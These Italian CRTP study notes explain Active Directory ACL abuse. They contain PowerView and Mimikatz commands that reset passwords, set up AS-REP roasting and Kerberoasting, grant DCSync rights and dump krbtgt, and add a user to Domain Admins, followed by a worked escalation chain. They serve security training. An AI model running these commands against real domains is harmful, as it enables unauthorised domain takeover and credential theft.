- [ACL](#acl)


# ACL
- In Windows ogni oggetto — file, cartella, chiave di registry, utente AD, gruppo AD, computer AD — ha associata una Access Control List che definisce chi può fare cosa su quell'oggetto.
- Gli ACL sono la parte pratica delle security descriptor. Nello specifico la DACL (Discretionary ACL) è la lista che ti interessa — contiene una serie di ACE (Access Control Entry), ognuna delle quali dice:
    ```
    CHI        COSA            TIPO
    Mario  →   Read, Write  →  Allow
    Luca   →   Read         →  Deny
    ```

## ACL su file vs ACL su oggetti AD
Su file e cartelle gli ACL controllano operazioni semplici — lettura, scrittura, esecuzione, eliminazione.

Su oggetti AD gli ACL controllano operazioni molto più potenti e specifiche:
```
GenericAll          →  controllo totale sull'oggetto
GenericWrite        →  modifica attributi dell'oggetto
WriteOwner          →  diventa proprietario dell'oggetto
WriteDacl           →  modifica la DACL dell'oggetto
ForceChangePassword →  cambia la password senza conoscerla
AddMember           →  aggiungi membri a un gruppo
ExtendedRight       →  diritti speciali come DCSync, reset password
AllExtendedRights   →  tutti i diritti estesi
```

## Perché sono importanti per la CRTP
In AD gli ACL vengono configurati dagli admin per delegare compiti specifici — "il team helpdesk può resettare le password degli utenti", "il team IT può aggiungere computer al dominio", ecc. Il problema è che nel tempo si accumulano permessi mal configurati che nessuno nota — e un attaccante può sfruttarli per scalare i privilegi senza usare nessuna vulnerabilità tecnica.

Il percorso classico è:
```
utente normale
    ↓
ha WriteDacl su gruppo "Domain Admins"
    ↓
si aggiunge alla propria DACL GenericAll
    ↓
si aggiunge al gruppo Domain Admins
    ↓
Domain Admin
```

Tutto legittimo dal punto di vista tecnico — stai solo usando permessi che hai.

## I permessi più croccanti e come abusarli
### GenericAll su utente — controllo totale. 
Puoi resettare la password, modificare qualsiasi attributo, disabilitare l'account:
```
# Resetti la password di mario senza conoscerla
Set-DomainUserPassword -Identity mario -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Oppure abiliti AS-REP Roasting su mario
Set-DomainObject -Identity mario -XOR @{useraccountcontrol=4194304}
# Poi fai AS-REP Roasting
Get-ASREPHash -Username mario
```

### GenericAll su gruppo
Aggiungi chiunque al gruppo
```
# Ti aggiungi al gruppo Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members "tuo-utente"

# Verifica
Get-DomainGroupMember -Identity "Domain Admins"
GenericWrite su utente — modifica attributi specifici. Utile per impostare uno SPN e fare Kerberoasting:
powershell# Imposti uno SPN su mario → diventa target di Kerberoasting
Set-DomainObject -Identity mario -Set @{serviceprincipalname='fake/spn'}

# Ora kerberoasti mario
Request-SPNTicket -SPN "fake/spn" -Format Hashcat
# Cracchi l'hash → hai la password di mario
```

### WriteDacl su oggetto
Modifichi la DACL e ti dai qualsiasi permesso:
```
# Ti dai GenericAll su Domain Admins
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "tuo-utente" -Rights All

# Ora hai GenericAll → ti aggiungi al gruppo
Add-DomainGroupMember -Identity "Domain Admins" -Members "tuo-utente"
```
### WriteOwner su oggetto
Diventi proprietario, poi modifichi la DACL:

```
# Diventi proprietario di Domain Admins
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "tuo-utente"

# Come proprietario ti dai WriteDacl
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "tuo-utente" -Rights WriteDacl

# Poi ti dai GenericAll e ti aggiungi
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "tuo-utente" -Rights All
Add-DomainGroupMember -Identity "Domain Admins" -Members "tuo-utente"
```

### ForceChangePassword
Cambi la password senza conoscerla:
```
Set-DomainUserPassword -Identity mario -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Credential $cred
```

### DCSync rights
```ExtendedRight``` con ```DS-Replication-Get-Changes-All``` su un utente ti permette di fare DCSync senza essere DA:
```
# Ti dai i diritti DCSync
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity "tuo-utente" -Rights DCSync

# Ora puoi fare DCSync come utente normale
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```

## Come trovarli con PowerView
```
# Trova tutti gli ACL interessanti nel dominio
Find-InterestingDomainAcl -ResolveGUIDs

# Filtra per i permessi più pericolosi
Find-InterestingDomainAcl -ResolveGUIDs | where {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights"
} | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights

# ACL su un oggetto specifico
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
    where {$_.AceType -eq "AccessAllowed"} |
    select SecurityIdentifier, ActiveDirectoryRights
```


## Scenario concreto
Sei mario, utente normale. PowerView trova questo:
```
IdentityReferenceName  ObjectDN                          ActiveDirectoryRights
mario                  CN=helpdesk,CN=Users,DC=corp,DC=local  GenericAll
helpdesk               CN=Domain Admins,CN=Users,DC=corp,DC=local  AddMember
```
Mario ha GenericAll su gruppo helpdesk, e helpdesk può aggiungere membri a Domain Admins. La chain è:
```
# Step 1: ti aggiungi al gruppo helpdesk (hai GenericAll su helpdesk)
Add-DomainGroupMember -Identity "helpdesk" -Members "mario"

# Step 2: come membro di helpdesk, aggiungi mario a Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members "mario"

# Step 3: verifica
Get-DomainGroupMember -Identity "Domain Admins"
# mario è DA
```

Questo tipo di chain — dove i permessi si concatenano attraverso più oggetti — è esattamente quello che BloodHound visualizza graficamente. Vedi BloodHound.md per più attachi e dettagli.